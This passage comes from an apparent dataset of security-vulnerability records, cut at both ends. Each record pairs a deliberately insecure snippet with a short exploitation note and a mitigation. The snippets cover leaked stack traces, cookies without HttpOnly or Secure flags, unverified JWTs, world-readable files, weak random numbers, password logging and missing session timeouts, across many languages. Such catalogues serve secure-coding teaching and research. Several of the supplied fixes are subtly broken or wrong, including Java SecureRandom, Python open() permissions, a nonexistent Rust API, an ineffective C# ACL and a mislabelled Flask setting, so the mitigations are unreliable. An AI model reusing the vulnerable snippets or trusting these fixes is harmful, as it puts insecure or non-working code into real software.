  "vulnerability_type": "Insecure HTTP Method Handling",
  "description": "Allowing all HTTP methods.",
  "code_snippet": "if ($r->uri =~ /^\/api/) { handle_request($r); }",
  "exploitation_techniques": "Exploit TRACE or PUT methods.",
  "mitigation": "Restrict: if ($r->method =~ /^(GET|POST)$/) { handle_request($r); }"
}
{
  "id": "vuln-694",
  "language": "Node.js",
  "vulnerability_type": "Insecure Error Handling",
  "description": "Exposing stack traces in production.",
  "code_snippet": "app.use((err, req, res, next) => res.status(500).send(err.stack));",
  "exploitation_techniques": "Extract sensitive info from stack traces.",
  "mitigation": "Hide details: res.status(500).send('Internal Server Error')"
}
{
  "id": "vuln-695",
  "language": "Python",
  "vulnerability_type": "Insecure Error Handling",
  "description": "Leaking stack traces in responses.",
  "code_snippet": "@app.errorhandler(Exception) def handle_error(e): return str(e), 500",
  "exploitation_techniques": "Gain insights from stack traces.",
  "mitigation": "Hide: return 'Internal Server Error', 500"
}
{
  "id": "vuln-696",
  "language": "Java",
  "vulnerability_type": "Insecure Error Handling",
  "description": "Exposing stack traces in production.",
  "code_snippet": "@ExceptionHandler(Exception.class) public ResponseEntity<?> handle(Exception e) { return ResponseEntity.status(500).body(e.getStackTrace()); }",
  "exploitation_techniques": "Extract sensitive data from stack traces.",
  "mitigation": "Hide: return ResponseEntity.status(500).body(\"Internal Server Error\")"
}
{
  "id": "vuln-697",
  "language": "PHP",
  "vulnerability_type": "Insecure Error Handling",
  "description": "Leaking stack traces in responses.",
  "code_snippet": "set_error_handler(function($errno, $errstr) { echo $errstr; });",
  "exploitation_techniques": "Gain insights from error details.",
  "mitigation": "Hide: echo 'Internal Server Error';"
}
{
  "id": "vuln-698",
  "language": "Ruby",
  "vulnerability_type": "Insecure Error Handling",
  "description": "Exposing stack traces in production.",
  "code_snippet": "rescue_from Exception do |e| render text: e.backtrace.join(\"\\n\") end",
  "exploitation_techniques": "Extract sensitive info from stack traces.",
  "mitigation": "Hide: render text: 'Internal Server Error', status: 500"
}
{
  "id": "vuln-699",
  "language": "Go",
  "vulnerability_type": "Insecure Error Handling",
  "description": "Leaking error details in responses.",
  "code_snippet": "http.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) { panic(\"error\") })",
  "exploitation_techniques": "Gain insights from error messages.",
  "mitigation": "Hide: http.Error(w, \"Internal Server Error\", http.StatusInternalServerError)"
}
{
  "id": "vuln-700",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Error Handling",
  "description": "Exposing stack traces in production.",
  "code_snippet": "app.UseExceptionHandler(errorApp => errorApp.Run(async context => await context.Response.WriteAsync(context.Exception.StackTrace)));",
  "exploitation_techniques": "Extract sensitive data from stack traces.",
  "mitigation": "Hide: await context.Response.WriteAsync(\"Internal Server Error\")"
}
{
  "id": "vuln-701",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Error Handling",
  "description": "Exposing stack traces in production responses.",
  "code_snippet": "exception<Exception> { call.respond(HttpStatusCode.InternalServerError, it.stackTraceToString()) }",
  "exploitation_techniques": "Extract sensitive information from stack traces.",
  "mitigation": "Hide details: call.respond(HttpStatusCode.InternalServerError, \"Internal Server Error\")"
}
{
  "id": "vuln-702",
  "language": "Scala",
  "vulnerability_type": "Insecure Error Handling",
  "description": "Leaking stack traces in production.",
  "code_snippet": "onFailure { case e: Exception => InternalServerError(e.getStackTrace.mkString(\"\\n\")) }",
  "exploitation_techniques": "Gain insights from stack traces.",
  "mitigation": "Hide: InternalServerError(\"Internal Server Error\")"
}
{
  "id": "vuln-703",
  "language": "Rust",
  "vulnerability_type": "Insecure Error Handling",
  "description": "Exposing error details in responses.",
  "code_snippet": "router.get(\"/\", |_, res| res.render_text(format!(\"{:?}\", panic!(\"error\"))))",
  "exploitation_techniques": "Extract sensitive data from error messages.",
  "mitigation": "Hide: res.status(StatusCode::INTERNAL_SERVER_ERROR).render_text(\"Internal Server Error\")"
}
{
  "id": "vuln-704",
  "language": "Elixir",
  "vulnerability_type": "Insecure Error Handling",
  "description": "Leaking stack traces in production.",
  "code_snippet": "plug :error_handler; def error_handler(conn, %{reason: reason}) do send_resp(conn, 500, inspect(reason)) end",
  "exploitation_techniques": "Gain insights from stack traces.",
  "mitigation": "Hide: send_resp(conn, 500, \"Internal Server Error\")"
}
{
  "id": "vuln-705",
  "language": "Perl",
  "vulnerability_type": "Insecure Error Handling",
  "description": "Exposing stack traces in responses.",
  "code_snippet": "eval { die \"error\"; }; $r->print($@) if $@;",
  "exploitation_techniques": "Extract sensitive info from stack traces.",
  "mitigation": "Hide: $r->print('Internal Server Error') if $@;"
}
{
  "id": "vuln-706",
  "language": "Node.js",
  "vulnerability_type": "Insecure Cookie Configuration",
  "description": "Cookies without HttpOnly flag.",
  "code_snippet": "res.cookie('session', token);",
  "exploitation_techniques": "Steal cookies via XSS.",
  "mitigation": "Set HttpOnly: res.cookie('session', token, { httpOnly: true })"
}
{
  "id": "vuln-707",
  "language": "Python",
  "vulnerability_type": "Insecure Cookie Configuration",
  "description": "Cookies missing HttpOnly flag.",
  "code_snippet": "response.set_cookie('session', token)",
  "exploitation_techniques": "Access cookies via XSS.",
  "mitigation": "Set: response.set_cookie('session', token, httponly=True)"
}
{
  "id": "vuln-708",
  "language": "Java",
  "vulnerability_type": "Insecure Cookie Configuration",
  "description": "Cookies without HttpOnly flag.",
  "code_snippet": "Cookie cookie = new Cookie(\"session\", token); response.addCookie(cookie);",
  "exploitation_techniques": "Steal cookies via XSS.",
  "mitigation": "Set: cookie.setHttpOnly(true); response.addCookie(cookie);"
}
{
  "id": "vuln-709",
  "language": "PHP",
  "vulnerability_type": "Insecure Cookie Configuration",
  "description": "Cookies missing HttpOnly flag.",
  "code_snippet": "setcookie('session', $token);",
  "exploitation_techniques": "Access cookies via XSS.",
  "mitigation": "Set: setcookie('session', $token, ['httponly' => true]);"
}
{
  "id": "vuln-710",
  "language": "Ruby",
  "vulnerability_type": "Insecure Cookie Configuration",
  "description": "Cookies without HttpOnly flag.",
  "code_snippet": "cookies[:session] = token",
  "exploitation_techniques": "Steal cookies via XSS.",
  "mitigation": "Set: cookies[:session] = { value: token, httponly: true }"
}
{
  "id": "vuln-711",
  "language": "Go",
  "vulnerability_type": "Insecure Cookie Configuration",
  "description": "Cookies missing HttpOnly flag.",
  "code_snippet": "http.SetCookie(w, &http.Cookie{Name: \"session\", Value: token})",
  "exploitation_techniques": "Access cookies via XSS.",
  "mitigation": "Set: http.SetCookie(w, &http.Cookie{Name: \"session\", Value: token, HttpOnly: true})"
}
{
  "id": "vuln-712",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Cookie Configuration",
  "description": "Cookies without HttpOnly flag.",
  "code_snippet": "Response.Cookies.Append(\"session\", token);",
  "exploitation_techniques": "Steal cookies via XSS.",
  "mitigation": "Set: Response.Cookies.Append(\"session\", token, new CookieOptions { HttpOnly = true });"
}
{
  "id": "vuln-713",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Cookie Configuration",
  "description": "Cookies missing HttpOnly flag.",
  "code_snippet": "call.response.cookies.append(\"session\", token)",
  "exploitation_techniques": "Access cookies via XSS.",
  "mitigation": "Set: call.response.cookies.append(\"session\", token, httpOnly = true)"
}
{
  "id": "vuln-714",
  "language": "Scala",
  "vulnerability_type": "Insecure Cookie Configuration",
  "description": "Cookies without HttpOnly flag.",
  "code_snippet": "Ok.withCookies(Cookie(\"session\", token))",
  "exploitation_techniques": "Steal cookies via XSS.",
  "mitigation": "Set: Ok.withCookies(Cookie(\"session\", token, httpOnly = true))"
}
{
  "id": "vuln-715",
  "language": "Rust",
  "vulnerability_type": "Insecure Cookie Configuration",
  "description": "Cookies missing HttpOnly flag.",
  "code_snippet": "res.cookie(Cookie::new(\"session\", token))",
  "exploitation_techniques": "Access cookies via XSS.",
  "mitigation": "Set: res.cookie(Cookie::new(\"session\", token).http_only(true))"
}
{
  "id": "vuln-716",
  "language": "Elixir",
  "vulnerability_type": "Insecure Cookie Configuration",
  "description": "Cookies without HttpOnly flag.",
  "code_snippet": "put_resp_cookie(conn, \"session\", token)",
  "exploitation_techniques": "Steal cookies via XSS.",
  "mitigation": "Set: put_resp_cookie(conn, \"session\", token, http_only: true)"
}
{
  "id": "vuln-717",
  "language": "Perl",
  "vulnerability_type": "Insecure Cookie Configuration",
  "description": "Cookies missing HttpOnly flag.",
  "code_snippet": "$r->headers_out->set('Set-Cookie' => \"session=$token\");",
  "exploitation_techniques": "Access cookies via XSS.",
  "mitigation": "Set: $r->headers_out->set('Set-Cookie' => \"session=$token; HttpOnly\");"
}
{
  "id": "vuln-718",
  "language": "Node.js",
  "vulnerability_type": "Insecure Cookie Scope",
  "description": "Cookies without Secure flag.",
  "code_snippet": "res.cookie('session', token, { httpOnly: true });",
  "exploitation_techniques": "Intercept cookies over HTTP.",
  "mitigation": "Set Secure: res.cookie('session', token, { httpOnly: true, secure: true })"
}
{
  "id": "vuln-719",
  "language": "Python",
  "vulnerability_type": "Insecure Cookie Scope",
  "description": "Cookies missing Secure flag.",
  "code_snippet": "response.set_cookie('session', token, httponly=True)",
  "exploitation_techniques": "Steal cookies over non-HTTPS connections.",
  "mitigation": "Set: response.set_cookie('session', token, httponly=True, secure=True)"
}
{
  "id": "vuln-720",
  "language": "Java",
  "vulnerability_type": "Insecure Cookie Scope",
  "description": "Cookies without Secure flag.",
  "code_snippet": "Cookie cookie = new Cookie(\"session\", token); cookie.setHttpOnly(true); response.addCookie(cookie);",
  "exploitation_techniques": "Intercept cookies over HTTP.",
  "mitigation": "Set: cookie.setSecure(true); response.addCookie(cookie);"
}
{
  "id": "vuln-721",
  "language": "PHP",
  "vulnerability_type": "Insecure Cookie Scope",
  "description": "Cookies missing Secure flag.",
  "code_snippet": "setcookie('session', $token, ['httponly' => true]);",
  "exploitation_techniques": "Steal cookies over HTTP.",
  "mitigation": "Set: setcookie('session', $token, ['httponly' => true, 'secure' => true]);"
}
{
  "id": "vuln-722",
  "language": "Ruby",
  "vulnerability_type": "Insecure Cookie Scope",
  "description": "Cookies without Secure flag.",
  "code_snippet": "cookies[:session] = { value: token, httponly: true }",
  "exploitation_techniques": "Intercept cookies over non-HTTPS.",
  "mitigation": "Set: cookies[:session] = { value: token, httponly: true, secure: true }"
}
{
  "id": "vuln-723",
  "language": "Go",
  "vulnerability_type": "Insecure Cookie Scope",
  "description": "Cookies missing Secure flag.",
  "code_snippet": "http.SetCookie(w, &http.Cookie{Name: \"session\", Value: token, HttpOnly: true})",
  "exploitation_techniques": "Steal cookies over HTTP.",
  "mitigation": "Set: http.SetCookie(w, &http.Cookie{Name: \"session\", Value: token, HttpOnly: true, Secure: true})"
}
{
  "id": "vuln-724",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Cookie Scope",
  "description": "Cookies without Secure flag.",
  "code_snippet": "Response.Cookies.Append(\"session\", token, new CookieOptions { HttpOnly = true });",
  "exploitation_techniques": "Intercept cookies over HTTP.",
  "mitigation": "Set: Response.Cookies.Append(\"session\", token, new CookieOptions { HttpOnly = true, Secure = true });"
}
{
  "id": "vuln-725",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Cookie Scope",
  "description": "Cookies missing Secure flag.",
  "code_snippet": "call.response.cookies.append(\"session\", token, httpOnly = true)",
  "exploitation_techniques": "Steal cookies over non-HTTPS.",
  "mitigation": "Set: call.response.cookies.append(\"session\", token, httpOnly = true, secure = true)"
}
{
  "id": "vuln-726",
  "language": "Scala",
  "vulnerability_type": "Insecure Cookie Scope",
  "description": "Cookies without Secure flag.",
  "code_snippet": "Ok.withCookies(Cookie(\"session\", token, httpOnly = true))",
  "exploitation_techniques": "Intercept cookies over HTTP.",
  "mitigation": "Set: Ok.withCookies(Cookie(\"session\", token, httpOnly = true, secure = true))"
}
{
  "id": "vuln-727",
  "language": "Rust",
  "vulnerability_type": "Insecure Cookie Scope",
  "description": "Cookies missing Secure flag.",
  "code_snippet": "res.cookie(Cookie::new(\"session\", token).http_only(true))",
  "exploitation_techniques": "Steal cookies over HTTP.",
  "mitigation": "Set: res.cookie(Cookie::new(\"session\", token).http_only(true).secure(true))"
}
{
  "id": "vuln-728",
  "language": "Elixir",
  "vulnerability_type": "Insecure Cookie Scope",
  "description": "Cookies without Secure flag.",
  "code_snippet": "put_resp_cookie(conn, \"session\", token, http_only: true)",
  "exploitation_techniques": "Intercept cookies over non-HTTPS.",
  "mitigation": "Set: put_resp_cookie(conn, \"session\", token, http_only: true, secure: true)"
}
{
  "id": "vuln-729",
  "language": "Perl",
  "vulnerability_type": "Insecure Cookie Scope",
  "description": "Cookies missing Secure flag.",
  "code_snippet": "$r->headers_out->set('Set-Cookie' => \"session=$token; HttpOnly\");",
  "exploitation_techniques": "Steal cookies over HTTP.",
  "mitigation": "Set: $r->headers_out->set('Set-Cookie' => \"session=$token; HttpOnly; Secure\");"
}
{
  "id": "vuln-730",
  "language": "Node.js",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Accepting JWTs without signature verification.",
  "code_snippet": "const payload = jwt.decode(token);",
  "exploitation_techniques": "Forge JWTs without signature checks.",
  "mitigation": "Verify: jwt.verify(token, secretKey)"
}
{
  "id": "vuln-731",
  "language": "Python",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Decoding JWTs without verifying signatures.",
  "code_snippet": "payload = jwt.decode(token, options={'verify_signature': False})",
  "exploitation_techniques": "Craft malicious JWTs.",
  "mitigation": "Verify: jwt.decode(token, key=secret, algorithms=['HS256'])"
}
{
  "id": "vuln-732",
  "language": "Java",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Parsing JWTs without signature validation.",
  "code_snippet": "DecodedJWT jwt = JWT.decode(token);",
  "exploitation_techniques": "Forge JWTs to bypass auth.",
  "mitigation": "Verify: JWT.require(Algorithm.HMAC256(secret)).build().verify(token)"
}
{
  "id": "vuln-733",
  "language": "PHP",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Decoding JWTs without verifying signatures.",
  "code_snippet": "$payload = JWT::decode($token, null);",
  "exploitation_techniques": "Craft forged JWTs.",
  "mitigation": "Verify: JWT::decode($token, new Key($secret, 'HS256'))"
}
{
  "id": "vuln-734",
  "language": "Ruby",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Accepting JWTs without signature checks.",
  "code_snippet": "payload = JWT.decode(token, nil, false)",
  "exploitation_techniques": "Forge JWTs to bypass authentication.",
  "mitigation": "Verify: JWT.decode(token, secret, true, algorithm: 'HS256')"
}
{
  "id": "vuln-735",
  "language": "Go",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Parsing JWTs without signature verification.",
  "code_snippet": "token, _ := jwt.Parse(tokenString, nil)",
  "exploitation_techniques": "Craft malicious JWTs.",
  "mitigation": "Verify: jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) { return secretKey, nil })"
}
{
  "id": "vuln-736",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Decoding JWTs without signature validation.",
  "code_snippet": "var payload = JwtSecurityTokenHandler().ReadJwtToken(token);",
  "exploitation_techniques": "Forge JWTs to bypass auth.",
  "mitigation": "Verify: new JwtSecurityTokenHandler().ValidateToken(token, validationParameters, out _)"
}
{
  "id": "vuln-737",
  "language": "Kotlin",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Parsing JWTs without signature checks.",
  "code_snippet": "val payload = JWT.decode(token)",
  "exploitation_techniques": "Craft forged JWTs.",
  "mitigation": "Verify: JWT.require(Algorithm.HMAC256(secret)).build().verify(token)"
}
{
  "id": "vuln-738",
  "language": "Scala",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Decoding JWTs without verifying signatures.",
  "code_snippet": "val payload = JWT.decode(token)",
  "exploitation_techniques": "Forge JWTs to bypass authentication.",
  "mitigation": "Verify: JWT.require(Algorithm.HMAC256(secret)).build.verify(token)"
}
{
  "id": "vuln-739",
  "language": "Rust",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Parsing JWTs without signature validation.",
  "code_snippet": "let claims = jsonwebtoken::decode::<Claims>(token, &DecodingKey::from_secret(&[]), &Validation::new(Algorithm::HS256))",
  "exploitation_techniques": "Craft malicious JWTs.",
  "mitigation": "Verify: jsonwebtoken::decode::<Claims>(token, &DecodingKey::from_secret(secret.as_ref()), &Validation::new(Algorithm::HS256))"
}
{
  "id": "vuln-740",
  "language": "Elixir",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Decoding JWTs without signature checks.",
  "code_snippet": "{:ok, payload} = Joken.peek(token)",
  "exploitation_techniques": "Forge JWTs to bypass auth.",
  "mitigation": "Verify: Joken.verify_and_validate(token, signer)"
}
{
  "id": "vuln-741",
  "language": "Perl",
  "vulnerability_type": "Insecure JWT Handling",
  "description": "Parsing JWTs without signature verification.",
  "code_snippet": "my $payload = decode_jwt($token);",
  "exploitation_techniques": "Craft forged JWTs.",
  "mitigation": "Verify: decode_jwt($token, $secret)"
}
{
  "id": "vuln-742",
  "language": "Node.js",
  "vulnerability_type": "Insecure File Permissions",
  "description": "World-readable sensitive files.",
  "code_snippet": "fs.writeFileSync('/app/config.json', JSON.stringify(config), { mode: 0o666 });",
  "exploitation_techniques": "Read sensitive data from files.",
  "mitigation": "Restrict: fs.writeFileSync('/app/config.json', JSON.stringify(config), { mode: 0o600 })"
}
{
  "id": "vuln-743",
  "language": "Python",
  "vulnerability_type": "Insecure File Permissions",
  "description": "World-readable sensitive configuration files.",
  "code_snippet": "with open('config.json', 'w', mode=0o666) as f: json.dump(config, f)",
  "exploitation_techniques": "Access sensitive file contents.",
  "mitigation": "Restrict: with open('config.json', 'w', mode=0o600) as f: json.dump(config, f)"
}
{
  "id": "vuln-744",
  "language": "Java",
  "vulnerability_type": "Insecure File Permissions",
  "description": "World-readable sensitive files.",
  "code_snippet": "Files.write(Paths.get(\"config.json\"), config.getBytes(), StandardOpenOption.CREATE);",
  "exploitation_techniques": "Read sensitive data from files.",
  "mitigation": "Set: Files.setPosixFilePermissions(Paths.get(\"config.json\"), PosixFilePermissions.fromString(\"rw-------\"))"
}
{
  "id": "vuln-745",
  "language": "PHP",
  "vulnerability_type": "Insecure File Permissions",
  "description": "World-readable sensitive files.",
  "code_snippet": "file_put_contents('config.json', json_encode($config), FILE_APPEND);",
  "exploitation_techniques": "Access sensitive file contents.",
  "mitigation": "Restrict: chmod('config.json', 0600); file_put_contents('config.json', json_encode($config));"
}
{
  "id": "vuln-746",
  "language": "Ruby",
  "vulnerability_type": "Insecure File Permissions",
  "description": "World-readable sensitive files.",
  "code_snippet": "File.write('config.json', config.to_json, mode: 'w')",
  "exploitation_techniques": "Read sensitive data from files.",
  "mitigation": "Restrict: File.write('config.json', config.to_json, mode: 'w', perm: 0600)"
}
{
  "id": "vuln-747",
  "language": "Go",
  "vulnerability_type": "Insecure File Permissions",
  "description": "World-readable sensitive files.",
  "code_snippet": "os.WriteFile(\"config.json\", []byte(config), 0666)",
  "exploitation_techniques": "Access sensitive file contents.",
  "mitigation": "Restrict: os.WriteFile(\"config.json\", []byte(config), 0600)"
}
{
  "id": "vuln-748",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure File Permissions",
  "description": "World-readable sensitive files.",
  "code_snippet": "File.WriteAllText(\"config.json\", JsonSerializer.Serialize(config));",
  "exploitation_techniques": "Read sensitive data from files.",
  "mitigation": "Restrict: File.SetAccessControl(\"config.json\", new FileSecurity(\"config.json\", AccessControlSections.All));"
}
{
  "id": "vuln-749",
  "language": "Kotlin",
  "vulnerability_type": "Insecure File Permissions",
  "description": "World-readable sensitive files.",
  "code_snippet": "File(\"config.json\").writeText(config.toJson())",
  "exploitation_techniques": "Access sensitive file contents.",
  "mitigation": "Restrict: File(\"config.json\").writeText(config.toJson(), permissions = PosixFilePermissions.asFileAttribute(setOf(OWNER_READ, OWNER_WRITE)))"
}
{
  "id": "vuln-750",
  "language": "Scala",
  "vulnerability_type": "Insecure File Permissions",
  "description": "World-readable sensitive files.",
  "code_snippet": "Files.write(Paths.get(\"config.json\"), config.getBytes)",
  "exploitation_techniques": "Read sensitive data from files.",
  "mitigation": "Restrict: Files.setPosixFilePermissions(Paths.get(\"config.json\"), PosixFilePermissions.fromString(\"rw-------\"))"
}
{
  "id": "vuln-751",
  "language": "Rust",
  "vulnerability_type": "Insecure File Permissions",
  "description": "World-readable sensitive files.",
  "code_snippet": "fs::write(\"config.json\", config.to_string())?",
  "exploitation_techniques": "Access sensitive file contents.",
  "mitigation": "Restrict: fs::OpenOptions::new().write(true).create(true).mode(0o600).open(\"config.json\")?.write_all(config.to_string().as_bytes())?"
}
{
  "id": "vuln-752",
  "language": "Elixir",
  "vulnerability_type": "Insecure File Permissions",
  "description": "World-readable sensitive files.",
  "code_snippet": "File.write(\"config.json\", Jason.encode!(config))",
  "exploitation_techniques": "Read sensitive data from files.",
  "mitigation": "Restrict: File.write(\"config.json\", Jason.encode!(config), [:write, :exclusive, :mode, 0o600])"
}
{
  "id": "vuln-753",
  "language": "Perl",
  "vulnerability_type": "Insecure File Permissions",
  "description": "World-readable sensitive files.",
  "code_snippet": "open(my $fh, '>', 'config.json'); print $fh encode_json($config);",
  "exploitation_techniques": "Access sensitive file contents.",
  "mitigation": "Restrict: open(my $fh, '>', 'config.json'); chmod(0600, 'config.json'); print $fh encode_json($config);"
}
{
  "id": "vuln-754",
  "language": "Node.js",
  "vulnerability_type": "Insecure Random Number Generation",
  "description": "Using Math.random for cryptographic purposes.",
  "code_snippet": "const token = Math.random().toString(36).substring(2);",
  "exploitation_techniques": "Predict random values.",
  "mitigation": "Use crypto: crypto.randomBytes(16).toString('hex')"
}
{
  "id": "vuln-755",
  "language": "Python",
  "vulnerability_type": "Insecure Random Number Generation",
  "description": "Using random module for security-critical operations.",
  "code_snippet": "token = ''.join(random.choices(string.ascii_letters, k=32))",
  "exploitation_techniques": "Predict random values due to weak PRNG.",
  "mitigation": "Use secrets: secrets.token_hex(16)"
}
{
  "id": "vuln-756",
  "language": "Java",
  "vulnerability_type": "Insecure Random Number Generation",
  "description": "Using Random instead of SecureRandom.",
  "code_snippet": "String token = new Random().nextLong().toString();",
  "exploitation_techniques": "Predict random values.",
  "mitigation": "Use: SecureRandom random = new SecureRandom(); random.nextBytes(new byte[16]).toString()"
}
{
  "id": "vuln-757",
  "language": "PHP",
  "vulnerability_type": "Insecure Random Number Generation",
  "description": "Using rand() for cryptographic purposes.",
  "code_snippet": "$token = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 32);",
  "exploitation_techniques": "Predict random values.",
  "mitigation": "Use: bin2hex(random_bytes(16))"
}
{
  "id": "vuln-758",
  "language": "Ruby",
  "vulnerability_type": "Insecure Random Number Generation",
  "description": "Using rand for security-critical operations.",
  "code_snippet": "token = (0...32).map { ('a'..'z').to_a[rand(26)] }.join",
  "exploitation_techniques": "Predict random values.",
  "mitigation": "Use: SecureRandom.hex(16)"
}
{
  "id": "vuln-759",
  "language": "Go",
  "vulnerability_type": "Insecure Random Number Generation",
  "description": "Using math/rand for cryptographic purposes.",
  "code_snippet": "token := fmt.Sprintf(\"%x\", rand.Int63())",
  "exploitation_techniques": "Predict random values due to weak PRNG.",
  "mitigation": "Use: crypto/rand; b := make([]byte, 16); rand.Read(b); hex.EncodeToString(b)"
}
{
  "id": "vuln-760",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Random Number Generation",
  "description": "Using Random for security-critical operations.",
  "code_snippet": "var token = new Random().Next().ToString();",
  "exploitation_techniques": "Predict random values.",
  "mitigation": "Use: RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider(); byte[] b = new byte[16]; rng.GetBytes(b); Convert.ToBase64String(b)"
}
{
  "id": "vuln-761",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Random Number Generation",
  "description": "Using Random for cryptographic purposes.",
  "code_snippet": "val token = Random().nextLong().toString()",
  "exploitation_techniques": "Predict random values.",
  "mitigation": "Use: SecureRandom().nextBytes(ByteArray(16)).toHex()"
}
{
  "id": "vuln-762",
  "language": "Scala",
  "vulnerability_type": "Insecure Random Number Generation",
  "description": "Using scala.util.Random for security-critical operations.",
  "code_snippet": "val token = scala.util.Random.nextLong().toString",
  "exploitation_techniques": "Predict random values.",
  "mitigation": "Use: java.security.SecureRandom().nextBytes(new Array[Byte](16)).toHex"
}
{
  "id": "vuln-763",
  "language": "Rust",
  "vulnerability_type": "Insecure Random Number Generation",
  "description": "Using rand::thread_rng for cryptographic purposes.",
  "code_snippet": "let token = thread_rng().gen::<u64>().to_string();",
  "exploitation_techniques": "Predict random values.",
  "mitigation": "Use: rand::crypto::SystemRandom.fill(&mut [0u8; 16]).to_hex()"
}
{
  "id": "vuln-764",
  "language": "Elixir",
  "vulnerability_type": "Insecure Random Number Generation",
  "description": "Using :rand for security-critical operations.",
  "code_snippet": "token = :rand.uniform(1_000_000) |> to_string",
  "exploitation_techniques": "Predict random values.",
  "mitigation": "Use: :crypto.strong_rand_bytes(16) |> Base.encode16()"
}
{
  "id": "vuln-765",
  "language": "Perl",
  "vulnerability_type": "Insecure Random Number Generation",
  "description": "Using rand for cryptographic purposes.",
  "code_snippet": "my $token = join('', map { ('a'..'z')[rand 26] } 1..32);",
  "exploitation_techniques": "Predict random values.",
  "mitigation": "Use: Crypt::Random::Source::random_bytes(16)->hex;"
}
{
  "id": "vuln-766",
  "language": "Node.js",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive data like passwords.",
  "code_snippet": "console.log(`User login: ${req.body.password}`);",
  "exploitation_techniques": "Extract sensitive data from logs.",
  "mitigation": "Avoid logging: console.log('User login attempt');"
}
{
  "id": "vuln-767",
  "language": "Python",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive information.",
  "code_snippet": "logging.info(f'User login: {request.form['password']}')",
  "exploitation_techniques": "Access sensitive data from logs.",
  "mitigation": "Avoid: logging.info('User login attempt')"
}
{
  "id": "vuln-768",
  "language": "Java",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive data like credentials.",
  "code_snippet": "log.info(\"User login: \" + request.getParameter(\"password\"));",
  "exploitation_techniques": "Extract credentials from logs.",
  "mitigation": "Avoid: log.info(\"User login attempt\")"
}
{
  "id": "vuln-769",
  "language": "PHP",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive data.",
  "code_snippet": "error_log('User login: ' . $_POST['password']);",
  "exploitation_techniques": "Access sensitive data from logs.",
  "mitigation": "Avoid: error_log('User login attempt');"
}
{
  "id": "vuln-770",
  "language": "Ruby",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive information.",
  "code_snippet": "Rails.logger.info \"User login: #{params[:password]}\"",
  "exploitation_techniques": "Extract sensitive data from logs.",
  "mitigation": "Avoid: Rails.logger.info 'User login attempt'"
}
{
  "id": "vuln-771",
  "language": "Go",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive data like passwords.",
  "code_snippet": "log.Printf(\"User login: %s\", r.FormValue(\"password\"))",
  "exploitation_techniques": "Access credentials from logs.",
  "mitigation": "Avoid: log.Print(\"User login attempt\")"
}
{
  "id": "vuln-772",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive information.",
  "code_snippet": "_logger.LogInformation($\"User login: {model.Password}\");",
  "exploitation_techniques": "Extract sensitive data from logs.",
  "mitigation": "Avoid: _logger.LogInformation(\"User login attempt\")"
}
{
  "id": "vuln-773",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive data like credentials.",
  "code_snippet": "logger.info(\"User login: ${call.request.queryParameters[\"password\"]}\")",
  "exploitation_techniques": "Access sensitive data from logs.",
  "mitigation": "Avoid: logger.info(\"User login attempt\")"
}
{
  "id": "vuln-774",
  "language": "Scala",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive information.",
  "code_snippet": "logger.info(s\"User login: ${params(\"password\")}\")",
  "exploitation_techniques": "Extract sensitive data from logs.",
  "mitigation": "Avoid: logger.info(\"User login attempt\")"
}
{
  "id": "vuln-775",
  "language": "Rust",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive data.",
  "code_snippet": "log::info!(\"User login: {}\", req.form::<Form>().await?.password);",
  "exploitation_techniques": "Access sensitive data from logs.",
  "mitigation": "Avoid: log::info!(\"User login attempt\")"
}
{
  "id": "vuln-776",
  "language": "Elixir",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive information.",
  "code_snippet": "Logger.info(\"User login: #{params[\"password\"]}\")",
  "exploitation_techniques": "Extract sensitive data from logs.",
  "mitigation": "Avoid: Logger.info(\"User login attempt\")"
}
{
  "id": "vuln-777",
  "language": "Perl",
  "vulnerability_type": "Insecure Logging",
  "description": "Logging sensitive data like passwords.",
  "code_snippet": "warn \"User login: \" . $r->param('password');",
  "exploitation_techniques": "Access sensitive data from logs.",
  "mitigation": "Avoid: warn \"User login attempt\";"
}
{
  "id": "vuln-778",
  "language": "Node.js",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "No session expiration set.",
  "code_snippet": "app.use(session({ secret: 'secret' }));",
  "exploitation_techniques": "Reuse old sessions indefinitely.",
  "mitigation": "Set timeout: session({ secret: 'secret', cookie: { maxAge: 3600000 } })"
}
{
  "id": "vuln-779",
  "language": "Python",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "Sessions without expiration.",
  "code_snippet": "app.config['SESSION_PERMANENT'] = False",
  "exploitation_techniques": "Hijack sessions with no expiry.",
  "mitigation": "Set: app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=60)"
}
{
  "id": "vuln-780",
  "language": "Java",
  "vulnerability_type": "Insecure Session Timeout",
  "description": "No session timeout configured.",
